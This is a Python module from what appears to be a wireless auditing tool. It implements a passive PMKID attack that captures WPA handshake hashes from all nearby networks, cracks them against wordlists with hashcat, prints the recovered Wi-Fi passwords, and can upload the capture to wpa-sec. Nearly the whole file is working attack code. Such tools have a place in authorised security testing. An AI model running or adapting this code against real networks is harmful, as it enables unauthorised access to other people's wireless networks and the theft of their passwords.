#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Passive PMKID Attack Module

Implements passive PMKID capture mode that monitors all nearby wireless
networks simultaneously without transmitting deauthentication frames.
Uses hcxdumptool with --rds=3 flag for passive capture.
"""

from ..config import Configuration
from ..util.color import Color
from ..tools.hashcat import Hashcat, HcxPcapngTool
from ..tools.hcxdumptool import HcxDumpToolPassive
from ..util.pmkid_monitor import PassivePMKIDMonitor
from ..util.wpasec_uploader import WpaSecUploader
from ..util.process import Process
import os
import time
import re

# TUI imports (optional)
try:
    from ..ui.attack_view import PassivePMKIDAttackView
    TUI_AVAILABLE = True
except ImportError:
    TUI_AVAILABLE = False


class AttackPassivePMKID:
    """
    Passive PMKID capture attack that monitors all networks simultaneously.

    Uses hcxdumptool for passive capture without deauth.
    Periodically extracts PMKID hashes from the capture file and saves them
    to individual .22000 files for offline cracking.
    """

    def __init__(self, tui_controller=None):
        """
        Initialize passive PMKID attack.

        Sets up capture file path, statistics tracking, and state variables.
        Initializes captured_pmkids dictionary to track captured hashes by BSSID.

        Args:
            tui_controller: Optional TUIController instance for TUI mode
        """
        # Generate capture file path
        self.pcapng_file = Configuration.temp('passive_pmkid.pcapng')

        # Dictionary to track captured PMKIDs by BSSID
        # Format: {bssid: {'essid': str, 'hash': str, 'file': str, 'captured_at': float}}
        self.captured_pmkids = {}

        # Monitoring thread reference
        self.monitor_thread = None

        # HcxDumpToolPassive process reference
        self.dumptool = None

        # Statistics dictionary
        self.statistics = {
            'networks_detected': 0,      # Total unique BSSIDs seen
            'pmkids_captured': 0,         # Total PMKIDs successfully captured
            'start_time': None,           # Unix timestamp of capture start
            'last_extraction': None,      # Unix timestamp of last hash extraction
            'capture_size_mb': 0.0,       # Current capture file size in MB
            'duration_seconds': 0         # Total capture duration
        }

        # TUI support
        self.tui_controller = tui_controller
        self.tui_view = None
        if tui_controller and TUI_AVAILABLE:
            self.tui_view = PassivePMKIDAttackView(tui_controller)
            self.tui_view.set_extraction_interval(Configuration.pmkid_passive_interval)
            self.tui_view.set_duration_limit(Configuration.pmkid_passive_duration)
            self.tui_view.set_capture_file_path(self.pcapng_file)

    def validate_dependencies(self):
        """
        Validate required tools are installed.

        Checks for hcxdumptool and hcxpcapngtool availability.
        Displays error message with installation instructions if tools are missing.

        Returns:
            bool: True if dependencies are satisfied, False otherwise
        """
        missing = []

        # Check for hcxdumptool
        if not Process.exists('hcxdumptool'):
            missing.append('hcxdumptool')

        # Check for hcxpcapngtool
        if not HcxPcapngTool.exists():
            missing.append('hcxpcapngtool')

        if missing:
            Color.pl('{!} {R}Missing required tools:{W} {O}%s{W}' % ', '.join(missing))
            Color.pl('{!} {O}Install with:{W} {C}apt install hcxdumptool hcxtools{W}')
            Color.pl('{!} {O}Or visit:{W}')
            Color.pl('{!}   {C}https://github.com/ZerBea/hcxdumptool{W}')
            Color.pl('{!}   {C}https://github.com/ZerBea/hcxtools{W}')
            return False

        return True

    def start_passive_capture(self):
        """
        Start hcxdumptool in passive mode.

        Uses HcxDumpToolPassive context manager to ensure proper cleanup.
        Stores process reference for monitoring.
        Displays startup message with capture details.

        Returns:
            HcxDumpToolPassive: The passive capture instance
        """
        if self.tui_view:
            # TUI mode - add logs instead of printing
            self.tui_view.add_log('Starting passive PMKID capture...')
            self.tui_view.add_log(f'Interface: {Configuration.interface}')
            self.tui_view.add_log(f'Capture file: {self.pcapng_file}')
            self.tui_view.add_log(f'Extraction interval: {Configuration.pmkid_passive_interval} seconds')

            if Configuration.pmkid_passive_duration > 0:
                self.tui_view.add_log(f'Duration: {Configuration.pmkid_passive_duration} seconds')
            else:
                self.tui_view.add_log('Duration: infinite (press Ctrl+C to stop)')
        else:
            # Classic mode
            Color.pl('{+} {C}Starting passive PMKID capture...{W}')
            Color.pl('{+} Interface: {G}%s{W}' % Configuration.interface)
            Color.pl('{+} Capture file: {C}%s{W}' % self.pcapng_file)
            Color.pl('{+} Extraction interval: {G}%d seconds{W}' % Configuration.pmkid_passive_interval)

            if Configuration.pmkid_passive_duration > 0:
                Color.pl('{+} Duration: {G}%d seconds{W}' % Configuration.pmkid_passive_duration)
            else:
                Color.pl('{+} Duration: {G}infinite{W} (press Ctrl+C to stop)')

            Color.pl('')

        # Create and return HcxDumpToolPassive instance
        # Will be used with context manager in run()
        return HcxDumpToolPassive(
            interface=Configuration.interface,
            output_file=self.pcapng_file
        )

    def start_monitoring_thread(self):
        """
        Start background thread for monitoring and extraction.

        Creates PassivePMKIDMonitor thread with self reference and extraction interval.
        Stores thread reference for cleanup.
        """
        self.monitor_thread = PassivePMKIDMonitor(
            attack_instance=self,
            interval=Configuration.pmkid_passive_interval
        )
        self.monitor_thread.start()

        if self.tui_view:
            self.tui_view.add_log('Monitoring thread started')
        else:
            Color.pl('{+} {G}Monitoring thread started{W}')

    def extract_and_save_pmkids(self):
        """
        Extract PMKID hashes from capture file and save them.

        Calls HcxPcapngTool.extract_all_pmkids() to get all PMKID hashes.
        Iterates through extracted hashes and saves new ones.
        Updates captured_pmkids dictionary with new entries.
        Updates statistics (networks_detected, pmkids_captured).
        """
        # Check if capture file exists and has data
        if not os.path.exists(self.pcapng_file):
            return

        if os.path.getsize(self.pcapng_file) == 0:
            return

        try:
            # Extract all PMKIDs from capture file
            pmkids = HcxPcapngTool.extract_all_pmkids(self.pcapng_file)

            if not pmkids:
                return

            # Track new PMKIDs found in this extraction
            new_pmkids = 0
            
            # Process each extracted PMKID
            for pmkid_data in pmkids:
                bssid = pmkid_data.get('bssid', '').upper()
                essid = pmkid_data.get('essid', '')
                pmkid_hash = pmkid_data.get('hash', '')

                # Skip if we already have this BSSID
                if bssid in self.captured_pmkids:
                    continue

                # Save the PMKID hash to file
                pmkid_file = self.save_pmkid_hash(bssid, essid, pmkid_hash)

                if pmkid_file:
                    # Add to captured_pmkids dictionary
                    self.captured_pmkids[bssid] = {
                        'essid': essid,
                        'hash': pmkid_hash,
                        'file': pmkid_file,
                        'captured_at': time.time()
                    }
                    new_pmkids += 1

                    # Notify TUI if available
                    if self.tui_view:
                        self.tui_view.add_pmkid_captured(essid, bssid)

            # Update statistics
            self.statistics['networks_detected'] = len(pmkids)
            self.statistics['pmkids_captured'] = len(self.captured_pmkids)
            self.statistics['last_extraction'] = time.time()

            # Update TUI or display in classic mode
            if self.tui_view:
                # Update TUI view with new statistics
                self.update_tui_statistics()
            elif new_pmkids > 0:
                # Classic mode - only show if new PMKIDs captured
                Color.pl('{+} {G}Captured %d new PMKID(s)!{W}' % new_pmkids)

        except Exception as e:
            error_msg = f'Error during hash extraction: {str(e)}'
            if self.tui_view:
                self.tui_view.add_log(f'[red]✗[/red] {error_msg}')
            else:
                Color.pl('{!} {R}%s{W}' % error_msg)

            if Configuration.verbose > 0:
                import traceback
                if self.tui_view:
                    self.tui_view.add_log(traceback.format_exc())
                else:
                    Color.pl('{!} {R}%s{W}' % traceback.format_exc())

    def save_pmkid_hash(self, bssid, essid, pmkid_hash):
        """
        Save a single PMKID hash to file.

        Generates filename with format: pmkid_{essid}_{bssid}_{timestamp}.22000
        Checks for existing file with same BSSID to prevent duplicates.
        Saves hash to Configuration.wpa_handshake_dir.

        Args:
            bssid (str): Target BSSID
            essid (str): Target ESSID
            pmkid_hash (str): PMKID hash in .22000 format

        Returns:
            str: File path of saved hash, or None if save failed
        """
        # Create handshake directory if it doesn't exist
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename
        essid_safe = re.sub('[^a-zA-Z0-9]', '', essid) if essid else 'hidden'
        bssid_safe = bssid.replace(':', '-')
        timestamp = time.strftime('%Y-%m-%dT%H-%M-%S')

        filename = f'pmkid_{essid_safe}_{bssid_safe}_{timestamp}.22000'
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, filename)

        # Check for existing file with same BSSID to prevent duplicates
        # This is a simple check - more sophisticated duplicate detection
        # could be added by checking file contents
        import glob
        pattern = os.path.join(Configuration.wpa_handshake_dir, f'pmkid_*_{bssid_safe}_*.22000')
        existing_files = glob.glob(pattern)

        if existing_files:
            # Already have a PMKID for this BSSID
            if Configuration.verbose > 1:
                Color.pl('{+} {D}Skipping duplicate PMKID for {C}%s{W}' % bssid)
            return None

        try:
            # Save hash to file
            with open(pmkid_file, 'w') as f:
                f.write(pmkid_hash)
                f.write('\n')

            if self.tui_view:
                # TUI mode - log is added by add_pmkid_captured in extract_and_save_pmkids
                pass
            else:
                # Classic mode
                Color.pl('{+} {G}Saved PMKID:{W} {C}%s{W} ({C}%s{W})' % (essid if essid else '<hidden>', bssid))
                Color.pl('{+} File: {C}%s{W}' % pmkid_file)

            return pmkid_file

        except Exception as e:
            error_msg = f'Error saving PMKID: {str(e)}'
            if self.tui_view:
                self.tui_view.add_log(f'[red]✗[/red] {error_msg}')
            else:
                Color.pl('{!} {R}%s{W}' % error_msg)
            return None

    def update_tui_statistics(self):
        """
        Update TUI view with current statistics.

        Called periodically to refresh the TUI display with latest capture data.
        """
        if not self.tui_view:
            return

        # Calculate capture file size
        if os.path.exists(self.pcapng_file):
            size_bytes = os.path.getsize(self.pcapng_file)
        else:
            size_bytes = 0

        # Update TUI view
        self.tui_view.update_capture_status(
            networks_detected=self.statistics['networks_detected'],
            pmkids_captured=self.statistics['pmkids_captured'],
            capture_file_size=size_bytes,
            last_extraction=self.statistics.get('last_extraction')
        )

    def display_statistics(self):
        """
        Display real-time capture statistics.

        Shows networks detected, PMKIDs captured, capture duration, and file size.
        Updates display periodically without clearing screen.
        Uses Color class for formatted output in classic mode.
        In TUI mode, updates the TUI view instead.
        """
        # Calculate duration
        if self.statistics['start_time']:
            self.statistics['duration_seconds'] = int(time.time() - self.statistics['start_time'])

        # Calculate capture file size
        if os.path.exists(self.pcapng_file):
            size_bytes = os.path.getsize(self.pcapng_file)
            self.statistics['capture_size_mb'] = size_bytes / (1024 * 1024)
        else:
            size_bytes = 0

        if self.tui_view:
            # TUI mode - update the view
            self.tui_view.update_capture_status(
                networks_detected=self.statistics['networks_detected'],
                pmkids_captured=self.statistics['pmkids_captured'],
                capture_file_size=size_bytes,
                last_extraction=self.statistics.get('last_extraction')
            )
            # Refresh view to update elapsed time
            self.tui_view.refresh_if_needed()
        else:
            # Classic mode - display on console
            # Format duration as HH:MM:SS
            duration = self.statistics['duration_seconds']
            hours = duration // 3600
            minutes = (duration % 3600) // 60
            seconds = duration % 60
            duration_str = f'{hours:02d}:{minutes:02d}:{seconds:02d}'

            # Display statistics
            Color.clear_entire_line()
            Color.p('\r{+} {C}Networks:{W} {G}%d{W} | {C}PMKIDs:{W} {G}%d{W} | {C}Duration:{W} {G}%s{W} | {C}Size:{W} {G}%.2f MB{W}' % (
                self.statistics['networks_detected'],
                self.statistics['pmkids_captured'],
                duration_str,
                self.statistics['capture_size_mb']
            ))

    def run(self):
        """
        Main entry point for passive PMKID attack.

        Validates dependencies before starting.
        Starts passive capture with HcxDumpToolPassive.
        Starts monitoring thread.
        Enters statistics display loop with keyboard interrupt handling.
        Handles duration timeout if configured.
        Calls cleanup on exit.
        """

        # Validate dependencies
        if not self.validate_dependencies():
            return False

        try:
            # Start TUI view if available
            if self.tui_view:
                self.tui_view.start()

            # Start passive capture
            with self.start_passive_capture() as dumptool:
                self.dumptool = dumptool

                # Record start time
                self.statistics['start_time'] = time.time()

                # Start monitoring thread
                self.start_monitoring_thread()

                # Calculate end time if duration is specified
                end_time = None
                if Configuration.pmkid_passive_duration > 0:
                    end_time = time.time() + Configuration.pmkid_passive_duration

                # Main statistics display loop
                try:
                    while True:
                        # Display statistics
                        self.display_statistics()

                        # Check if duration timeout reached
                        if end_time and time.time() >= end_time:
                            if self.tui_view:
                                self.tui_view.add_log('Duration timeout reached')
                            else:
                                Color.pl('\n{+} {G}Duration timeout reached{W}')
                            break

                        # Sleep briefly
                        time.sleep(1)

                except KeyboardInterrupt:
                    if self.tui_view:
                        self.tui_view.add_log('Interrupted by user')
                    else:
                        Color.pl('\n{!} {O}Interrupted by user{W}')

                # Cleanup
                self.cleanup()

        except Exception as e:
            error_msg = f'Error during passive capture: {str(e)}'
            if self.tui_view:
                self.tui_view.add_log(f'[red]✗[/red] {error_msg}')
            else:
                Color.pl('\n{!} {R}%s{W}' % error_msg)
            
            if Configuration.verbose > 0:
                import traceback
                if self.tui_view:
                    self.tui_view.add_log(traceback.format_exc())
                else:
                    Color.pl('{!} {R}%s{W}' % traceback.format_exc())
            return False
        finally:
            # Stop TUI view if it was started
            if self.tui_view:
                self.tui_view.stop()

        return True

    def cleanup(self):
        """
        Stop capture and perform final extraction.

        Stops monitoring thread gracefully.
        Stops hcxdumptool process (handled by context manager).
        Performs final hash extraction from capture file.
        Displays final statistics.
        Preserves capture file and extracted hashes.
        """
        if self.tui_view:
            self.tui_view.add_log('Cleaning up...')
        else:
            Color.pl('\n{+} {C}Cleaning up...{W}')

        # Stop monitoring thread
        if self.monitor_thread:
            self.monitor_thread.stop()
            self.monitor_thread.join(timeout=5)
            if self.tui_view:
                self.tui_view.add_log('Monitoring thread stopped')
            else:
                Color.pl('{+} {G}Monitoring thread stopped{W}')
        
        # Perform final extraction
        if self.tui_view:
            self.tui_view.add_log('Performing final hash extraction...')
        else:
            Color.pl('{+} {C}Performing final hash extraction...{W}')
        self.extract_and_save_pmkids()
        
        # Display final statistics
        if self.tui_view:
            self.tui_view.add_log('')
            self.tui_view.add_log('[bold green]Passive PMKID Capture Complete[/bold green]')
            self.tui_view.add_log(f'Networks detected: {self.statistics["networks_detected"]}')
            self.tui_view.add_log(f'PMKIDs captured: {self.statistics["pmkids_captured"]}')
            self.tui_view.add_log(f'Capture duration: {self.statistics["duration_seconds"]} seconds')
            self.tui_view.add_log(f'Capture file: {self.pcapng_file} ({self.statistics["capture_size_mb"]:.2f} MB)')
            self.tui_view.add_log('')
        else:
            Color.pl('')
            Color.pl('{+} {G}Passive PMKID Capture Complete{W}')
            Color.pl('{+} Networks detected: {G}%d{W}' % self.statistics['networks_detected'])
            Color.pl('{+} PMKIDs captured: {G}%d{W}' % self.statistics['pmkids_captured'])
            Color.pl('{+} Capture duration: {G}%d seconds{W}' % self.statistics['duration_seconds'])
            Color.pl('{+} Capture file: {C}%s{W} ({G}%.2f MB{W})' % (
                self.pcapng_file,
                self.statistics['capture_size_mb']
            ))
            Color.pl('')
        
        # Offer post-capture options
        if self.statistics['pmkids_captured'] > 0:
            # Offer to crack captured PMKIDs
            if not Configuration.skip_crack and Configuration.wordlist:
                self.crack_captured_pmkids()
            
            # Offer to upload to wpa-sec
            if WpaSecUploader.should_upload():
                self.upload_to_wpasec()
    
    def crack_captured_pmkids(self):
        """
        Crack all captured PMKID hashes.
        
        Checks if wordlist is configured.
        Iterates through captured_pmkids dictionary.
        Calls Hashcat.crack_pmkid() for each hash file.
        Displays cracking results.
        Saves successful cracks to results.
        """
        Color.pl('{+} {C}Attempting to crack captured PMKIDs...{W}')
        
        if not Configuration.wordlist:
            Color.pl('{!} {O}No wordlist specified, skipping crack{W}')
            Color.pl('{!} {O}Use {C}--dict{O} to specify a wordlist or directory{W}')
            return

        wordlists_to_try = [wl for wl in Configuration.wordlists if os.path.exists(wl)]
        if not wordlists_to_try:
            wordlists_to_try = [Configuration.wordlist]

        cracked_count = 0

        for bssid, pmkid_data in self.captured_pmkids.items():
            essid = pmkid_data['essid']
            pmkid_file = pmkid_data['file']

            Color.pl('')
            Color.pl('{+} {C}Cracking PMKID for:{W} {G}%s{W} ({C}%s{W})' % (
                essid if essid else '<hidden>',
                bssid
            ))

            # Attempt to crack with each wordlist
            key = None
            for wordlist in wordlists_to_try:
                key = Hashcat.crack_pmkid(pmkid_file, verbose=Configuration.verbose > 0, wordlist=wordlist)
                if key:
                    break

            if key:
                cracked_count += 1
                Color.pl('{+} {G}SUCCESS!{W} Password: {G}%s{W}' % key)

                # Save result
                from ..model.pmkid_result import CrackResultPMKID
                result = CrackResultPMKID(bssid, essid, pmkid_file, key)
                result.save()
                result.dump()
            else:
                Color.pl('{!} {R}Failed to crack{W} (password not in any wordlist)')
        
        Color.pl('')
        Color.pl('{+} {C}Cracking complete:{W} {G}%d{W}/{G}%d{W} PMKIDs cracked' % (
            cracked_count,
            len(self.captured_pmkids)
        ))
    
    def upload_to_wpasec(self):
        """
        Upload capture file to wpa-sec.
        
        Checks if wpa-sec upload is enabled.
        Calls WpaSecUploader.upload_capture() with pcapng file.
        Passes capture_type='pmkid_passive' for identification.
        Displays upload status.
        """
        Color.pl('')
        Color.pl('{+} {C}Uploading capture to wpa-sec...{W}')
        
        # Upload the pcapng file (not individual hash files)
        success = WpaSecUploader.upload_capture(
            capfile=self.pcapng_file,
            bssid='multiple',  # Multiple BSSIDs in passive capture
            essid='passive_capture',
            capture_type='pmkid_passive'
        )
        
        if success:
            Color.pl('{+} {G}Upload successful!{W}')
        else:
            Color.pl('{!} {R}Upload failed{W}')
